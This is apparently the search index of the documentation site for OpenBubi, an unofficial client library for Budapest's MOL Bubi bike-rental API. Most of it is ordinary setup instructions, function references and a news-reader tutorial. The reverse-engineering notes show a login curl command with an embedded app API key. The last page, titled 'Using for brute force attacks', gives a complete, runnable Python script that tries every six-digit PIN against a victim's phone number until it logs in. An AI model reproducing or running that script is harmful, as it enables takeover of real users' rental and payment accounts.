{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"OpenBubi Open-source module for the Hungarian bike-rental system, MOL Bubi Why OpenBubi? OpenBubi is a really nice solution, and it is easy to integrate. OpenBubi has really nice feautures, like checking the type of the parameters (in Python), and having asynchronous methods (in Dart). Those features are making OpenBubi really good. There are some use cases: You can make a smart-watch app, that can be used to rent bikes You can redesign the MOL Bubi web app You can make a data analyzing algorithm for MOL Bubi routes (a couple of Hungarians have already done this , but they would have had an easier time with OpenBubi :D) You can make a smart assistant that can calculate the path to the nearest MOL Bubi station, and then rent a bike on that station You can make a MOL Bubi client with a TUI (Text User Interface), or a CLI (Command Line Interface) You can make an algorithm that fetches MOL Bubi news, and if the news contains some keywords, it alerts Get started To get started, try it out","title":"Home"},{"location":"#openbubi","text":"","title":"OpenBubi"},{"location":"#open-source-module-for-the-hungarian-bike-rental-system-mol-bubi","text":"","title":"Open-source module for the Hungarian bike-rental system, MOL Bubi"},{"location":"#why-openbubi","text":"OpenBubi is a really nice solution, and it is easy to integrate. OpenBubi has really nice feautures, like checking the type of the parameters (in Python), and having asynchronous methods (in Dart). Those features are making OpenBubi really good. There are some use cases: You can make a smart-watch app, that can be used to rent bikes You can redesign the MOL Bubi web app You can make a data analyzing algorithm for MOL Bubi routes (a couple of Hungarians have already done this , but they would have had an easier time with OpenBubi :D) You can make a smart assistant that can calculate the path to the nearest MOL Bubi station, and then rent a bike on that station You can make a MOL Bubi client with a TUI (Text User Interface), or a CLI (Command Line Interface) You can make an algorithm that fetches MOL Bubi news, and if the news contains some keywords, it alerts","title":"Why OpenBubi?"},{"location":"#get-started","text":"To get started, try it out","title":"Get started"},{"location":"about/","text":"About Known issues We assume that Budapest is a small city Budapest is a \"small\" city, but with a potentially larger city (or even a country), the algorithm wouldn't work, because it doesn't account with the curvature of the Earth. So for OpenBubi to work on larger cities, it needs to switch to the Haversine-formula instead of the Pythagorean-theorem. But the Haversine-formula isn't perfect either, because it doesn't account with the Earth being a geoid, not a sphere. I think I'll use 3rd party libraries, like geopy . Thanks for the help in the reverse engineering, Br\u00fan\u00f3 Salomon","title":"About"},{"location":"about/#about","text":"","title":"About"},{"location":"about/#known-issues","text":"We assume that Budapest is a small city Budapest is a \"small\" city, but with a potentially larger city (or even a country), the algorithm wouldn't work, because it doesn't account with the curvature of the Earth. So for OpenBubi to work on larger cities, it needs to switch to the Haversine-formula instead of the Pythagorean-theorem. But the Haversine-formula isn't perfect either, because it doesn't account with the Earth being a geoid, not a sphere. I think I'll use 3rd party libraries, like geopy .","title":"Known issues"},{"location":"about/#thanks-for-the-help-in-the-reverse-engineering-bruno-salomon","text":"","title":"Thanks for the help in the reverse engineering, Br\u00fan\u00f3 Salomon"},{"location":"notes/","text":"Reverse engineering notes https://futar.bkk.hu/api/query/v1/ws/otp/api/where/bicycle-rental.json?key=bkk-web&version=4 https://futar.bkk.hu/api/query/v1/ws/otp/api/where/bicycle-rental.json?key=bkk-web&version=4&appVersion=3.13.0-58029-74e31c4b https://api-budapest.nextbike.net/maps/nextbike-live.json?domains=bh https://api-budapest.nextbike.net/maps/nextbike-live.flatjson?domains=bh https://api-budapest.nextbike.net/maps/nextbike-official.json?domains=bh curl -X POST -F 'mobile=xxx' -F 'pin=xxx' -F 'apikey=Bbx3nGP291xEtDmq' -F 'show_errors=1' -F 'domain=bh' https://api-budapest.nextbike.net/api/v1.1/login.json https://github.com/h0chi/nextbike-api-reverse-engineering","title":"Reverse-engineering notes"},{"location":"notes/#reverse-engineering-notes","text":"","title":"Reverse engineering notes"},{"location":"notes/#httpsfutarbkkhuapiqueryv1wsotpapiwherebicycle-rentaljsonkeybkk-webversion4","text":"","title":"https://futar.bkk.hu/api/query/v1/ws/otp/api/where/bicycle-rental.json?key=bkk-web&amp;version=4"},{"location":"notes/#httpsfutarbkkhuapiqueryv1wsotpapiwherebicycle-rentaljsonkeybkk-webversion4appversion3130-58029-74e31c4b","text":"","title":"https://futar.bkk.hu/api/query/v1/ws/otp/api/where/bicycle-rental.json?key=bkk-web&amp;version=4&amp;appVersion=3.13.0-58029-74e31c4b"},{"location":"notes/#httpsapi-budapestnextbikenetmapsnextbike-livejsondomainsbh","text":"","title":"https://api-budapest.nextbike.net/maps/nextbike-live.json?domains=bh"},{"location":"notes/#httpsapi-budapestnextbikenetmapsnextbike-liveflatjsondomainsbh","text":"","title":"https://api-budapest.nextbike.net/maps/nextbike-live.flatjson?domains=bh"},{"location":"notes/#httpsapi-budapestnextbikenetmapsnextbike-officialjsondomainsbh","text":"","title":"https://api-budapest.nextbike.net/maps/nextbike-official.json?domains=bh"},{"location":"notes/#curl-x-post-f-mobilexxx-f-pinxxx-f-apikeybbx3ngp291xetdmq-f-show_errors1-f-domainbh-httpsapi-budapestnextbikenetapiv11loginjson","text":"","title":"curl -X POST -F 'mobile=xxx' -F 'pin=xxx' -F 'apikey=Bbx3nGP291xEtDmq' -F 'show_errors=1' -F 'domain=bh' https://api-budapest.nextbike.net/api/v1.1/login.json"},{"location":"notes/#httpsgithubcomh0chinextbike-api-reverse-engineering","text":"","title":"https://github.com/h0chi/nextbike-api-reverse-engineering"},{"location":"usage/gui/","text":"Try it out using a fancy GUI Note: On Ubuntu, you can get a dependency error, (about tkinter ) when you're trying to run the GUI. If this is the case, run make , or (manually) sudo apt install python3-tk . (I don't know if this error is present in other distros -> try it for yourself, and maybe start a Pull Request about it) Start the GUI python ./gui/login.py Enter your MOL Bubi credentials Enjoy the experience :D","title":"Try it out using a fancy GUI"},{"location":"usage/gui/#try-it-out-using-a-fancy-gui","text":"Note: On Ubuntu, you can get a dependency error, (about tkinter ) when you're trying to run the GUI. If this is the case, run make , or (manually) sudo apt install python3-tk . (I don't know if this error is present in other distros -> try it for yourself, and maybe start a Pull Request about it) Start the GUI python ./gui/login.py Enter your MOL Bubi credentials Enjoy the experience :D","title":"Try it out using a fancy GUI"},{"location":"usage/dartpackage/functions/","text":"Built-in functions of the Dart package BubiUser(phoneNumber, pin) ( phoneNumber, and pin needs to be a string ) info() (async) - returns user information in JSON (not map) format -> if you want it in map format, import json , and use json.decode(info()) getScreenName() (async) - grabs the screen name from info() , and returns it getLoginKey() (async) - grabs the login key from info() , and returns it callOtherEndpoint(relativeURL, data) (async) - ( relativeURL needs to be a string, and data needs to be a map ) calls the specified endpoint with the specified data (plus loginkey , domain , apikey , show_errors ), and returns the output. ( you can find endpoints here ) rentBike(bikeNumber) (async) - ( bikeNumber needs to be an integer ) rents a bike, and returns the output getRentals() (async) - returns information about the user's rentals getClosedRentals() (async) - returns closed rentals from getRentals() getActiveRentals() (async) - returns active rentals getPaymentLinks() (async) - returns information about payment links getSubscriptionInfo() (async) - returns the end of the subscription, and the type of the subscription getSubScriptionType() (async) - returns the type of the subscription based on getSubscriptionInfo() (monthly, or annual) getEndOfSubscription() (async) - returns the end of the subscription based on getSubscriptionInfo() (date) moreInfo() (async) - returns a LOT of information about the user getRentalDetails() (async) - returns information about the current rental BubiMap() listAllStations() (async) - returns a JSON object containing all stations listAllBikes() (async) - returns a JSON object containing all bikes listAllBikesFormatted() (async) - returns a JSON object containing all bikes (without the unnecessary parts) listAllStationsFormatted() (async) - returns a JSON object containing all stations (without the unnecessary parts) getNearestStations(lat, lon) (async) - ( lat, and lon needs to be a float ) returns a JSON object containing all stations, sorted by proximity to lat , and lon . Distance is counted in geographical degrees. (calculated using the Pythagorean theorem) getNearestStation(lat, lon) (async) - ( lat, and lon needs to be a float ) returns the nearest station's name by latitude, and longitude (based on the first key of getNearestStations ) getNearestStationByAddress(address) (async) - returns the nearest station's name by address (using getNearestStation() , and OpenStreetMap API) listAllBikesOnStations(stationName) (async) - returns all the bikes on a station (and the number of these bikes, and information about these bikes) countBikesOnStation(stationName) (async) - counts all the bikes on a station (using listAllBikesOnStation() ), and returns the counter getCoordinatesOfStation(stationName) (async) - returns the coordinates of a station (latitude, longitude) BubiHelpers() register() - Work in progress... pinReset(mobile) - Work in progress... getNews() (async) - Returns all the news in a JSON format getNewsFormatted() (async) - Returns all the news from the mobile app without the unnecessary parts (based on getNews() ) readNew(uid) (async) - Returns the HTML page of a specific new article with the given uid (based on getNewsFormatted() ) ( uid needs to be an integer )","title":"Built-in functions of the Dart package"},{"location":"usage/dartpackage/functions/#built-in-functions-of-the-dart-package","text":"","title":"Built-in functions of the Dart package"},{"location":"usage/dartpackage/functions/#bubiuserphonenumber-pin-phonenumber-and-pin-needs-to-be-a-string","text":"info() (async) - returns user information in JSON (not map) format -> if you want it in map format, import json , and use json.decode(info()) getScreenName() (async) - grabs the screen name from info() , and returns it getLoginKey() (async) - grabs the login key from info() , and returns it callOtherEndpoint(relativeURL, data) (async) - ( relativeURL needs to be a string, and data needs to be a map ) calls the specified endpoint with the specified data (plus loginkey , domain , apikey , show_errors ), and returns the output. ( you can find endpoints here ) rentBike(bikeNumber) (async) - ( bikeNumber needs to be an integer ) rents a bike, and returns the output getRentals() (async) - returns information about the user's rentals getClosedRentals() (async) - returns closed rentals from getRentals() getActiveRentals() (async) - returns active rentals getPaymentLinks() (async) - returns information about payment links getSubscriptionInfo() (async) - returns the end of the subscription, and the type of the subscription getSubScriptionType() (async) - returns the type of the subscription based on getSubscriptionInfo() (monthly, or annual) getEndOfSubscription() (async) - returns the end of the subscription based on getSubscriptionInfo() (date) moreInfo() (async) - returns a LOT of information about the user getRentalDetails() (async) - returns information about the current rental","title":"BubiUser(phoneNumber, pin) (phoneNumber, and pin needs to be a string)"},{"location":"usage/dartpackage/functions/#bubimap","text":"listAllStations() (async) - returns a JSON object containing all stations listAllBikes() (async) - returns a JSON object containing all bikes listAllBikesFormatted() (async) - returns a JSON object containing all bikes (without the unnecessary parts) listAllStationsFormatted() (async) - returns a JSON object containing all stations (without the unnecessary parts) getNearestStations(lat, lon) (async) - ( lat, and lon needs to be a float ) returns a JSON object containing all stations, sorted by proximity to lat , and lon . Distance is counted in geographical degrees. (calculated using the Pythagorean theorem) getNearestStation(lat, lon) (async) - ( lat, and lon needs to be a float ) returns the nearest station's name by latitude, and longitude (based on the first key of getNearestStations ) getNearestStationByAddress(address) (async) - returns the nearest station's name by address (using getNearestStation() , and OpenStreetMap API) listAllBikesOnStations(stationName) (async) - returns all the bikes on a station (and the number of these bikes, and information about these bikes) countBikesOnStation(stationName) (async) - counts all the bikes on a station (using listAllBikesOnStation() ), and returns the counter getCoordinatesOfStation(stationName) (async) - returns the coordinates of a station (latitude, longitude)","title":"BubiMap()"},{"location":"usage/dartpackage/functions/#bubihelpers","text":"register() - Work in progress... pinReset(mobile) - Work in progress... getNews() (async) - Returns all the news in a JSON format getNewsFormatted() (async) - Returns all the news from the mobile app without the unnecessary parts (based on getNews() ) readNew(uid) (async) - Returns the HTML page of a specific new article with the given uid (based on getNewsFormatted() ) ( uid needs to be an integer )","title":"BubiHelpers()"},{"location":"usage/dartpackage/installation/","text":"Installation of the Dart package Open up a terminal Clone the repository of the source code git clone https://github.com/piciakk/OpenBubi-Dart Go to the source code's directory cd OpenBubi-Dart Try it out dart run","title":"Installation of the Dart package"},{"location":"usage/dartpackage/installation/#installation-of-the-dart-package","text":"Open up a terminal Clone the repository of the source code git clone https://github.com/piciakk/OpenBubi-Dart Go to the source code's directory cd OpenBubi-Dart Try it out dart run","title":"Installation of the Dart package"},{"location":"usage/dartpackage/overview/","text":"Overview of the Dart package There you can find a simple guide for using the package. There are two classes: BubiUser , and BubiMap . In this tutorial, I'll use these classes. First of all, make a new Dart app. To achieve this, run dart create -t console-full openbubi-tutorial , and go to that folder ( cd openbubi-tutorial ). Then go to the lib folder cd lib , and download openbubi.dart there. wget https://raw.githubusercontent.com/PiciAkk/OpenBubi-Dart/main/app/lib/openbubi.dart Then go back to the bin folder cd ../bin/ And clear all the code from cli.dart . Now you can start editing your first OpenBubi-Dart program. 1.) Import the package import 'package:openbubi_tutorial/openbubi.dart' as openbubi ; 2.) Make a new instance of the BubiUser , and the BubiMap class // making a BubiUser instance (this takes two arguments) openbubi . BubiUser testUser = new openbubi . BubiUser ( \"phoneNumber\" , \"pin\" ); // Making a BubiMap instance (this takes no argument) openbubi . BubiMap testMap = new openbubi . BubiMap (); 3.) Print the name of the testUser user print ( await testUser . getScreenName ()); 4.) With these simple steps, we can make a program that takes a phone number, a pin, and prints out a name import 'package:openbubi_tutorial/openbubi.dart' as openbubi ; import 'dart:io' ; void main () async { stdin . echoMode = false ; stdout . write ( 'Please enter your phone number: ' ); var phoneNumber = await stdin . readLineSync (); // we need the await keyword because this is an async function stdout . write ( ' \\n Please enter your pin: ' ); var pin = await stdin . readLineSync (); // we need the await keyword because this is an async function var user = await openbubi . BubiUser ( phoneNumber ?? \"\" , pin ?? \"\" ); // provide empty string if input is empty stdout . write ( \" \\n ${ await user . getScreenName () } \\n \" ); } 5.) Run the program dart run Output: Congratulations! You've made your first OpenBubi program! \ud83c\udf89 You can read a more technical documentation about the built-in functions here .","title":"Overview of the Dart package"},{"location":"usage/dartpackage/overview/#overview-of-the-dart-package","text":"There you can find a simple guide for using the package. There are two classes: BubiUser , and BubiMap . In this tutorial, I'll use these classes. First of all, make a new Dart app. To achieve this, run dart create -t console-full openbubi-tutorial , and go to that folder ( cd openbubi-tutorial ). Then go to the lib folder cd lib , and download openbubi.dart there. wget https://raw.githubusercontent.com/PiciAkk/OpenBubi-Dart/main/app/lib/openbubi.dart Then go back to the bin folder cd ../bin/ And clear all the code from cli.dart . Now you can start editing your first OpenBubi-Dart program. 1.) Import the package import 'package:openbubi_tutorial/openbubi.dart' as openbubi ; 2.) Make a new instance of the BubiUser , and the BubiMap class // making a BubiUser instance (this takes two arguments) openbubi . BubiUser testUser = new openbubi . BubiUser ( \"phoneNumber\" , \"pin\" ); // Making a BubiMap instance (this takes no argument) openbubi . BubiMap testMap = new openbubi . BubiMap (); 3.) Print the name of the testUser user print ( await testUser . getScreenName ()); 4.) With these simple steps, we can make a program that takes a phone number, a pin, and prints out a name import 'package:openbubi_tutorial/openbubi.dart' as openbubi ; import 'dart:io' ; void main () async { stdin . echoMode = false ; stdout . write ( 'Please enter your phone number: ' ); var phoneNumber = await stdin . readLineSync (); // we need the await keyword because this is an async function stdout . write ( ' \\n Please enter your pin: ' ); var pin = await stdin . readLineSync (); // we need the await keyword because this is an async function var user = await openbubi . BubiUser ( phoneNumber ?? \"\" , pin ?? \"\" ); // provide empty string if input is empty stdout . write ( \" \\n ${ await user . getScreenName () } \\n \" ); } 5.) Run the program dart run Output: Congratulations! You've made your first OpenBubi program! \ud83c\udf89 You can read a more technical documentation about the built-in functions here .","title":"Overview of the Dart package"},{"location":"usage/dartpackage/smartwatch/","text":"Coming soon...","title":"Making a smart-watch app using flutter-tizen"},{"location":"usage/dartpackage/smartwatch/#coming-soon","text":"","title":"Coming soon..."},{"location":"usage/dartpackage/tryout/","text":"","title":"Tryout"},{"location":"usage/pymodule/bubinews/","text":"Making a news reader What are we going to do? We are going to make a Tkinter-based GUI program that lists the MOL Bubi news. Dependencies The only (not preinstalled) dependency for this project is tkhtmlview . If you want to install it with pip, type the following command: pip install tkhtmlview Write the program First of all, make a new Python script in the cloned folder mkdir bubinews && touch bubinews/bubinews.py Then import all the necessary modules in the newly created program/script import sys # for manipulating the path sys . path . append ( \"../\" ) # add the folder of openbubi.py to the path import openbubi from tkinter import * # for making the GUI import json # for converting the output of openbubi to a dictionary import datetime # for converting epoch time to datetime from tkhtmlview import HTMLLabel # for displaying HTML elements in tkinter Then initialize a Tkinter window with the name root , and title BubiNews root = Tk () root . title ( \"BubiNews\" ) Then make a label with the text BubiNews . This is going to be the title Label ( root , text = \"BubiNews\" , font = ( \"Helvetica\" , 20 )) . pack () Then Initialize a new instance of the BubiHelpers class Get the news in JSON format Convert the news (from JSON) to dictionary format helpers = openbubi . BubiHelpers () news = json . loads ( helpers . getNewsFormatted ()) Then iterate through the news, and make a paragraph for each for i in news : currentTitle = i [ \"title\" ] # set the `currentTitle` variable to the title of the current article currentDate = i [ \"created_time\" ] # set the `currentDate` variable to the created_time of the current article (it is an epoch time) currentURL = i [ \"url_webview\" ] # set the `currentURL` variable to the url_webview of the current article currentDate = datetime . datetime . fromtimestamp ( currentDate ) . strftime ( '%Y-%m- %d %H:%M:%S' ) # convert the `currentDate` variable to datetime format headerLabel = HTMLLabel ( root , html = f \"<a style='font-size: 12px' href=' { currentURL } '><p style='text-align: center'> { currentTitle } </p></a>\" , width = 100 , height = 1.5 ) # make a HTML paragraph that redirects you to the website with the URL of `currentURL` dateLabel = Label ( root , text = f \"( { currentDate } )\" , font = ( \"Helvetica\" , 10 )) # make a label that contains the date of the article headerLabel . pack () # place the headerLabel dateLabel . pack () # place the dateLabel Then call the mainloop() function of the root window root . mainloop () And the final code is: import sys # for manipulating the path sys . path . append ( \"../\" ) # add the folder of openbubi.py to the path import openbubi from tkinter import * # for making the GUI import json # for converting the output of openbubi to a dictionary import datetime # for converting epoch time to datetime from tkhtmlview import HTMLLabel # for displaying HTML elements in tkinter root = Tk () root . title ( \"BubiNews\" ) Label ( root , text = \"BubiNews\" , font = ( \"Helvetica\" , 20 )) . pack () helpers = openbubi . BubiHelpers () news = json . loads ( helpers . getNewsFormatted ()) for i in news : currentTitle = i [ \"title\" ] # set the `currentTitle` variable to the title of the current article currentDate = i [ \"created_time\" ] # set the `currentDate` variable to the created_time of the current article (it is an epoch time) currentURL = i [ \"url_webview\" ] # set the `currentURL` variable to the url_webview of the current article currentDate = datetime . datetime . fromtimestamp ( currentDate ) . strftime ( '%Y-%m- %d %H:%M:%S' ) # convert the `currentDate` variable to datetime format headerLabel = HTMLLabel ( root , html = f \"<a style='font-size: 12px' href=' { currentURL } '><p style='text-align: center'> { currentTitle } </p></a>\" , width = 100 , height = 1.5 ) # make a HTML paragraph that redirects you to the website with the URL of `currentURL` dateLabel = Label ( root , text = f \"( { currentDate } )\" , font = ( \"Helvetica\" , 10 )) # make a label that contains the date of the article headerLabel . pack () # place the headerLabel dateLabel . pack () # place the dateLabel root . mainloop () Source code I uploaded the source code of this program to GitHub","title":"Making a news reader"},{"location":"usage/pymodule/bubinews/#making-a-news-reader","text":"","title":"Making a news reader"},{"location":"usage/pymodule/bubinews/#what-are-we-going-to-do","text":"We are going to make a Tkinter-based GUI program that lists the MOL Bubi news.","title":"What are we going to do?"},{"location":"usage/pymodule/bubinews/#dependencies","text":"The only (not preinstalled) dependency for this project is tkhtmlview . If you want to install it with pip, type the following command: pip install tkhtmlview","title":"Dependencies"},{"location":"usage/pymodule/bubinews/#write-the-program","text":"First of all, make a new Python script in the cloned folder mkdir bubinews && touch bubinews/bubinews.py Then import all the necessary modules in the newly created program/script import sys # for manipulating the path sys . path . append ( \"../\" ) # add the folder of openbubi.py to the path import openbubi from tkinter import * # for making the GUI import json # for converting the output of openbubi to a dictionary import datetime # for converting epoch time to datetime from tkhtmlview import HTMLLabel # for displaying HTML elements in tkinter Then initialize a Tkinter window with the name root , and title BubiNews root = Tk () root . title ( \"BubiNews\" ) Then make a label with the text BubiNews . This is going to be the title Label ( root , text = \"BubiNews\" , font = ( \"Helvetica\" , 20 )) . pack () Then Initialize a new instance of the BubiHelpers class Get the news in JSON format Convert the news (from JSON) to dictionary format helpers = openbubi . BubiHelpers () news = json . loads ( helpers . getNewsFormatted ()) Then iterate through the news, and make a paragraph for each for i in news : currentTitle = i [ \"title\" ] # set the `currentTitle` variable to the title of the current article currentDate = i [ \"created_time\" ] # set the `currentDate` variable to the created_time of the current article (it is an epoch time) currentURL = i [ \"url_webview\" ] # set the `currentURL` variable to the url_webview of the current article currentDate = datetime . datetime . fromtimestamp ( currentDate ) . strftime ( '%Y-%m- %d %H:%M:%S' ) # convert the `currentDate` variable to datetime format headerLabel = HTMLLabel ( root , html = f \"<a style='font-size: 12px' href=' { currentURL } '><p style='text-align: center'> { currentTitle } </p></a>\" , width = 100 , height = 1.5 ) # make a HTML paragraph that redirects you to the website with the URL of `currentURL` dateLabel = Label ( root , text = f \"( { currentDate } )\" , font = ( \"Helvetica\" , 10 )) # make a label that contains the date of the article headerLabel . pack () # place the headerLabel dateLabel . pack () # place the dateLabel Then call the mainloop() function of the root window root . mainloop () And the final code is: import sys # for manipulating the path sys . path . append ( \"../\" ) # add the folder of openbubi.py to the path import openbubi from tkinter import * # for making the GUI import json # for converting the output of openbubi to a dictionary import datetime # for converting epoch time to datetime from tkhtmlview import HTMLLabel # for displaying HTML elements in tkinter root = Tk () root . title ( \"BubiNews\" ) Label ( root , text = \"BubiNews\" , font = ( \"Helvetica\" , 20 )) . pack () helpers = openbubi . BubiHelpers () news = json . loads ( helpers . getNewsFormatted ()) for i in news : currentTitle = i [ \"title\" ] # set the `currentTitle` variable to the title of the current article currentDate = i [ \"created_time\" ] # set the `currentDate` variable to the created_time of the current article (it is an epoch time) currentURL = i [ \"url_webview\" ] # set the `currentURL` variable to the url_webview of the current article currentDate = datetime . datetime . fromtimestamp ( currentDate ) . strftime ( '%Y-%m- %d %H:%M:%S' ) # convert the `currentDate` variable to datetime format headerLabel = HTMLLabel ( root , html = f \"<a style='font-size: 12px' href=' { currentURL } '><p style='text-align: center'> { currentTitle } </p></a>\" , width = 100 , height = 1.5 ) # make a HTML paragraph that redirects you to the website with the URL of `currentURL` dateLabel = Label ( root , text = f \"( { currentDate } )\" , font = ( \"Helvetica\" , 10 )) # make a label that contains the date of the article headerLabel . pack () # place the headerLabel dateLabel . pack () # place the dateLabel root . mainloop ()","title":"Write the program"},{"location":"usage/pymodule/bubinews/#source-code","text":"I uploaded the source code of this program to GitHub","title":"Source code"},{"location":"usage/pymodule/functions/","text":"Built-in functions of the Python module BubiUser(phoneNumber, pin) ( phoneNumber, and pin needs to be a string ) info() - returns user information in JSON (not dictionary) format -> if you want it in dictionary format, import json , and use json.loads(info()) getScreenName() - grabs the screen name from info() , and returns it getLoginKey() - grabs the login key from info() , and returns it callOtherEndpoint(relativeURL, data) ( relativeURL needs to be a string, and data needs to be a dictionary ) - calls the specified endpoint with the specified data (plus loginkey , domain , apikey , show_errors ), and returns the output. ( you can find endpoints here ) rentBike(bikeNumber) ( bikeNumber needs to be an integer ) - rents a bike, and returns the output getRentals() - returns information about the user's rentals getClosedRentals() - returns closed rentals from getRentals() getActiveRentals() - returns active rentals getPaymentLinks() - returns information about payment links getSubscriptionInfo() - returns the end of the subscription, and the type of the subscription getSubscriptionType() - returns the type of the subscription based on getSubscriptionInfo() (monthly, or annual) getEndOfSubscription() - returns the end of the subscription based on getSubscriptionInfo() (date) moreInfo() - returns a LOT of information about the user getRentalDetails() - returns information about the current rental BubiMap() listAllStations() - returns a JSON object containing all stations listAllBikes() - returns a JSON object containing all bikes listAllBikesFormatted() - returns a JSON object containing all bikes (without the unnecessary parts) listAllStationsFormatted() - returns a JSON object containing all stations (without the unnecessary parts) getNearestStations(lat, lon) - ( lat, and lon needs to be a float ) returns a JSON object containing all stations, sorted by proximity to lat , and lon . Distance is counted in geographical degrees. (calculated using the Pythagorean theorem) getNearestStation(lat, lon) - ( lat, and lon needs to be a float ) returns the nearest station's name by latitude, and longitude (based on the first key of getNearestStations ) getNearestStationByAddress(address) - returns the nearest station's name by address (using getNearestStation() , and OpenStreetMap API) listAllBikesOnStations(stationName) - returns all the bikes on a station (and the number of these bikes, and information about these bikes) countBikesOnStation(stationName) - counts all the bikes on a station (using listAllBikesOnStation() ), and returns the counter getCoordinatesOfStation(stationName) - returns the coordinates of a station (latitude, longitude) BubiHelpers() register() - Work in progress... pinReset(mobile) - Work in progress... getNews() - Returns all the news in JSON format getNewsFormatted() - Returns all the news from the mobile app without the unnecessary parts (based on getNews() ) readNew(uid) - Returns the HTML page of a specific new article with the given uid (based on getNewsFormatted() ) ( uid needs to be an integer )","title":"Built-in functions of the Python module"},{"location":"usage/pymodule/functions/#built-in-functions-of-the-python-module","text":"","title":"Built-in functions of the Python module"},{"location":"usage/pymodule/functions/#bubiuserphonenumber-pin-phonenumber-and-pin-needs-to-be-a-string","text":"info() - returns user information in JSON (not dictionary) format -> if you want it in dictionary format, import json , and use json.loads(info()) getScreenName() - grabs the screen name from info() , and returns it getLoginKey() - grabs the login key from info() , and returns it callOtherEndpoint(relativeURL, data) ( relativeURL needs to be a string, and data needs to be a dictionary ) - calls the specified endpoint with the specified data (plus loginkey , domain , apikey , show_errors ), and returns the output. ( you can find endpoints here ) rentBike(bikeNumber) ( bikeNumber needs to be an integer ) - rents a bike, and returns the output getRentals() - returns information about the user's rentals getClosedRentals() - returns closed rentals from getRentals() getActiveRentals() - returns active rentals getPaymentLinks() - returns information about payment links getSubscriptionInfo() - returns the end of the subscription, and the type of the subscription getSubscriptionType() - returns the type of the subscription based on getSubscriptionInfo() (monthly, or annual) getEndOfSubscription() - returns the end of the subscription based on getSubscriptionInfo() (date) moreInfo() - returns a LOT of information about the user getRentalDetails() - returns information about the current rental","title":"BubiUser(phoneNumber, pin) (phoneNumber, and pin needs to be a string)"},{"location":"usage/pymodule/functions/#bubimap","text":"listAllStations() - returns a JSON object containing all stations listAllBikes() - returns a JSON object containing all bikes listAllBikesFormatted() - returns a JSON object containing all bikes (without the unnecessary parts) listAllStationsFormatted() - returns a JSON object containing all stations (without the unnecessary parts) getNearestStations(lat, lon) - ( lat, and lon needs to be a float ) returns a JSON object containing all stations, sorted by proximity to lat , and lon . Distance is counted in geographical degrees. (calculated using the Pythagorean theorem) getNearestStation(lat, lon) - ( lat, and lon needs to be a float ) returns the nearest station's name by latitude, and longitude (based on the first key of getNearestStations ) getNearestStationByAddress(address) - returns the nearest station's name by address (using getNearestStation() , and OpenStreetMap API) listAllBikesOnStations(stationName) - returns all the bikes on a station (and the number of these bikes, and information about these bikes) countBikesOnStation(stationName) - counts all the bikes on a station (using listAllBikesOnStation() ), and returns the counter getCoordinatesOfStation(stationName) - returns the coordinates of a station (latitude, longitude)","title":"BubiMap()"},{"location":"usage/pymodule/functions/#bubihelpers","text":"register() - Work in progress... pinReset(mobile) - Work in progress... getNews() - Returns all the news in JSON format getNewsFormatted() - Returns all the news from the mobile app without the unnecessary parts (based on getNews() ) readNew(uid) - Returns the HTML page of a specific new article with the given uid (based on getNewsFormatted() ) ( uid needs to be an integer )","title":"BubiHelpers()"},{"location":"usage/pymodule/hackerguide/","text":"Using for brute force attacks Disclaimer: this guide is for educational purposes only. I do not support black-hat hacking, because it is illegal What are we going to do? We are going to make an algorithm, that tries to login to a MOL Bubi account with every 6-digit password Write the program First of all, make a new Python script in the cloned folder mkdir bubiforce && touch bubiforce/bubiforce.py Then import all the necessary modules in the newly created program/script import sys # for path manipulation sys . path . append ( \"../\" ) # add openbubi.py's folder to the current path import openbubi import json # for converting openbubi output to dictionary import itertools # for making an iterable object with all the six-digit numbers import getpass # for getting input from the user without echoing Then get an input from the user about the phone number of the victim phoneNumber = getpass . getpass ( \"Please enter a phone number: \" ) Then make a for cycle, that iterates over the list of six-digit numbers (using itertools ), and tries every possible password for authenticating # make an iterable object that contains all six-digit numbers, and iterate through that for i in itertools . product ( \"0123456789\" , repeat = 6 ): # convert the elements of the current tuple to a string currentNum = \"\" . join ( i ) # print currentNum out print ( currentNum ) # make a new BubiUser instance with the password `currentNum` user = openbubi . BubiUser ( phoneNumber , currentNum ) \"\"\" Really long line, but I'll explain it. If there is an error while logging in, MOL Bubi returns an error code like this: { \"server_time\": 1635867338, \"error\": { \"code\": 1, \"message\": \"A felhaszn\u00e1l\u00f3 nem tal\u00e1lhat\u00f3, vagy a bejelentkez\u00e9s nem siker\u00fclt.\", \"reference\": \"61815aca3f4fe\" } } There is a JSON object, that contains an error key with a value that contains another JSON object with the error code, error message, and reference. So, if we want to detect login failure, we need to check if there is a key named \"error\". So we need to: 1. Convert the output of user.login() to a dictionary 2. Convert all the keys of this dictionary into a list 3. Check if the statement 'there is an element in that list called error' is false 4. If that is false, then we got no errors, and the pin is correct \"\"\" if ( \"error\" in list ( json . loads ( user . info ()) . keys ())) == False : # there is no error print ( f \"Match! The pin is { currentNum } \" ) quit () # quit the program The complete code is: import sys # for path manipulation sys . path . append ( \"../\" ) # add openbubi.py's folder to the current path import openbubi import json # for converting openbubi output to dictionary import itertools # for making an iterable object with all the six-digit numbers import getpass # for getting input from the user without echoing phoneNumber = getpass . getpass ( \"Please enter a phone number: \" ) # make an iterable object that contains all six-digit numbers, and iterate through that for i in itertools . product ( \"0123456789\" , repeat = 6 ): # convert the elements of the current tuple to a string currentNum = \"\" . join ( i ) # print currentNum out print ( currentNum ) # make a new BubiUser instance with the password `currentNum` user = openbubi . BubiUser ( phoneNumber , currentNum ) \"\"\" Really long line, but I'll explain it. If there is an error while logging in, MOL Bubi returns an error code like this: { \"server_time\": 1635867338, \"error\": { \"code\": 1, \"message\": \"A felhaszn\u00e1l\u00f3 nem tal\u00e1lhat\u00f3, vagy a bejelentkez\u00e9s nem siker\u00fclt.\", \"reference\": \"61815aca3f4fe\" } } There is a JSON object, that contains an error key with a value that contains another JSON object with the error code, error message, and reference. So, if we want to detect login failure, we need to check if there is a key named \"error\". So we need to: 1. Convert the output of user.login() to a dictionary 2. Convert all the keys of this dictionary into a list 3. Check if the statement 'there is an element in that list called error' is false 4. If that is false, then we got no errors, and the pin is correct \"\"\" if ( \"error\" in list ( json . loads ( user . info ()) . keys ())) == False : # there is no error print ( f \"Match! The pin is { currentNum } \" ) quit () # quit the program Usage Go to the program's directory cd bubiforce Run the program python bubiforce.py Example output: Please enter a phone number: 000000 000001 000002 000003 ... Source code I uploaded the source code of this program to GitHub","title":"<p align=\"center\">Using for brute force attacks</p>"},{"location":"usage/pymodule/hackerguide/#using-for-brute-force-attacks","text":"Disclaimer: this guide is for educational purposes only. I do not support black-hat 